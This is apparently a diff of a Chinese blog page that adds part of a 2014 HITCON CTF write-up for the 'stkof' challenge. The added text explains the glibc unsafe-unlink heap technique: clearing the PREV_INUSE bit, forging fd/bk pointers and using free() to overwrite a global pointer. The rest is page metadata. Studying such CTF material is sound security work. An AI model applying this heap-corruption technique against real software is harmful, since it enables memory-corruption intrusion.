+<p>注意修改前的 <code>size</code> 正常为 <code>0x91</code>，修改后为 <code>0x90</code>，相当于清除了最低位的 <code>PREV_INUSE</code> 标志</p>
+<p><img src="https://pic1.imgdb.cn/i/034cYYmZPq7rGhwxrMJ6JJ.png" alt="pasted_1791493462627_za7oaj.png"></p>
+<p>学习两个新概念：<code>fd</code> 和 <code>bk</code></p>
+<p>glibc 管理某些空闲 Chunk 时，会使用双向链表</p>
+<p>其中：</p>
+<ul>
+<li><p><code>fd</code>（forward pointer）：指向链表中的后继节点</p>
+</li>
+<li><p><code>bk</code>（backward pointer）：指向链表中的前驱节点</p>
+</li>
+</ul>
+<p><img src="https://pic1.imgdb.cn/i/034cahpgh1Vz3ZXz44XwpH.png" alt="pasted_1791498709228_htati2.png"></p>
+<p>正常的 Unlink 操作，是将某个空闲节点 <code>P</code> 从链表中摘除，让它的前后两个节点重新连接</p>
+<p>它还需要通过 Chunk 大小一致性等检查。我们接下来就是利用这些指针操作，改变 <code>s[2]</code></p>
+<p>通过伪造 Chunk，让 <code>free(3)</code> 修改全局指针表中的 <code>s[2]</code></p>
+<p>我们已经知道</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x602140 → s[0]</span><br><span class="line">0x602148 → s[1]</span><br><span class="line">0x602150 → s[2]</span><br><span class="line">0x602158 → s[3]</span><br></pre></td></tr></table></figure>
+
+<p>在 64 位 glibc 的空闲 Chunk 结构中：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">偏移量       字段</span><br><span class="line"></span><br><span class="line">+0x00       prev_size</span><br><span class="line">+0x08       size</span><br><span class="line">+0x10       fd</span><br><span class="line">+0x18       bk</span><br></pre></td></tr></table></figure>
+
+<p>Unlink 会执行</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;</span><br><span class="line">BK-&gt;fd = FD;</span><br></pre></td></tr></table></figure>
+
+<p>我们希望这两条语句都修改 <code>s[2]</code>，所以要让</p>
+<p>这次我们想让它发生这样的变化</p>
+<p><img src="https://pic1.imgdb.cn/i/034cZRr48SIx2MXtY1OpgN.png" alt="pasted_1791495634322_vma433.png"></p>
+
     </div>
     <footer class="article-footer">
         <a class="article-category-link" href="/categories/CTF/" title="CTF" data-aos="zoom-in">CTF</a>
@@ -333,10 +529,10 @@
       </div>
       <div>
         <span class="icon-brush"></span>
-        337.6k
+        338.1k
         &nbsp;|&nbsp;
         <span class="icon-coffee"></span>
-        27:27
+        27:28
       </div>
       <div>
         <span class="icon-eye"></span>
@@ -358,7 +554,7 @@
   <div class="sidebar-wrap">
         <div class="sidebar-toc-sidebar"><h3 class="toc-title">文章目录</h3>
 <div class="sidebar-toc-wrapper toc-div-class" >
-    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2014-HITCON-CTF-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2014 HITCON CTF WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stkof"><span class="toc-number">1.1.1.</span> <span class="toc-text">stkof</span></a></li></ol></li></ol></li></ol>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#2014-HITCON-CTF-WriteUp"><span class="toc-number">1.</span> <span class="toc-text">2014 HITCON CTF WriteUp</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Pwn"><span class="toc-number">1.1.</span> <span class="toc-text">Pwn</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#stkof%EF%BC%88Unsafe-Unlink%EF%BC%89"><span class="toc-number">1.1.1.</span> <span class="toc-text">stkof（Unsafe Unlink）</span></a></li></ol></li></ol></li></ol>
 </div>
 </div>
         <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
@@ -369,11 +565,11 @@
 <div class="sidebar-state">
   <div class="sidebar-state-article">
     <div>文章</div>
-    <div class="sidebar-state-number">256</div>
+    <div class="sidebar-state-number">253</div>
   </div>
   <div class="sidebar-state-category">
     <div>分类</div>
-    <div class="sidebar-state-number">20</div>
+    <div class="sidebar-state-number">19</div>
   </div>
   <div class="sidebar-state-tag">
     <div>标签</div>
@@ -492,7 +688,7 @@
           description: "",
           stripContent: "2014 HITCON CTF WriteUp🏆 赛事概况  赛事全称：HITCON CTF 2014  比赛时间：2014 年 8 月 16 日 12:00 至 8 月 18 日 12:00（UTC+8），共 48 小时  比赛形式：线上 Jeopardy（解题）模式  参赛规模：吸引了来自全球 71 个国家的 1,020 支队伍参赛  题目类型：涵盖 Trivial、Web Security、Binary Processing、Forensics、Pwn3d 等类别  奖金（新台币）：冠军",
           date: "Mon Apr 14 2014 13:18:00 GMT+0800",
-          updated: "Wed Sep 30 2026 16:41:40 GMT+0800",
+          updated: "Fri Oct 09 2026 06:41:16 GMT+0800",
           cover: "/images/banner.webp",
         };
       </script>
